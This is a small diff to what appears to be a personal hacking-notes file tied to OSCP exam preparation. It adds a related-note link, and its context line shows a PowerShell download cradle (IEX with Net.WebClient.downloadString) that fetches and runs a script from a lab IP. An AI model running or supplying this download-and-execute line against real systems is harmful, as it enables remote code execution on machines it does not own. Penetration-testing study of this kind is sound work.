@@ -8,6 +8,7 @@ IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
 
 # Related
 
+- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
 - [20221003151101](/zet/20221003151101/README.md) powershell commands
 - ~/kb/hacking/windows/windows-reverse-shell.md
 
